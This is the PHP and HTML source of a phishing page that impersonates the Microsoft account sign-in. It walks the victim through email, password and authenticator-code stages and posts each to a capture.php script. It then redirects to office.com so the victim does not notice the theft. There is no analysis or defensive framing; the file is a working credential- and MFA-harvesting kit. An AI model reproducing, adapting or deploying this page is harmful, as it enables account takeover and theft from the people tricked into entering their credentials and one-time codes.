<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        .email-display { font-size: 14px; color: #666; margin-bottom: 24px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 10px 8px; font-size: 15px; border: 1px solid #666;
            margin-bottom: 16px; outline: none;
        }
        input:focus { border-color: #0067b8; }
        .submit-btn {
            background: #0067b8; color: white; border: none; padding: 10px 20px;
            font-size: 15px; cursor: pointer; float: right;
        }
        .submit-btn:hover { background: #005a9e; }
        .link { color: #0067b8; text-decoration: none; font-size: 13px; display: block; margin-bottom: 8px; }
        .mfa-info { font-size: 13px; color: #666; margin-bottom: 16px; line-height: 1.5; }
        .mfa-code { letter-spacing: 8px; font-size: 24px; text-align: center; }
        .error { color: #d83b01; font-size: 13px; margin-bottom: 12px; }
        .loader { display: none; text-align: center; padding: 20px; }
        .loader.active { display: block; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjwvc3ZnPg==" class="logo" alt="Microsoft">

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
        <a href="#" class="link">Can't access your account?</a>
        <a href="#" class="link">Sign-in options</a>
        <button type="submit" class="submit-btn">Next</button>
    </form>

    <?php elseif($stage == 'password'): ?>
    <a href="?stage=email" class="link" style="margin-bottom:16px;">&larr; <?=$email?></a>
    <h1>Enter password</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Password" required autofocus>
        <a href="#" class="link">Forgot my password</a>
        <button type="submit" class="submit-btn">Sign in</button>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>Verify your identity</h1>
    <p class="mfa-info">Enter the code from your authenticator app or SMS.</p>
    <form method="POST" action="capture.php" id="mfaForm">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="______" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <a href="#" class="link">I can't use my authenticator app right now</a>
        <button type="submit" class="submit-btn">Verify</button>
    </form>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Verifying...</p>
    </div>

    <?php elseif($stage == 'complete'): ?>
    <h1>Verification complete</h1>
    <p class="mfa-info">Please wait while we redirect you...</p>
    <div class="loader active">
        <div class="spinner"></div>
    </div>
    <script>setTimeout(function(){window.location='https://www.office.com';},3000);</script>

    <?php endif; ?>
</div>
<script>
document.getElementById('mfaForm')?.addEventListener('submit', function(e) {
    document.getElementById('loader').classList.add('active');
    this.style.display = 'none';
});
</script>
</body>
</html>
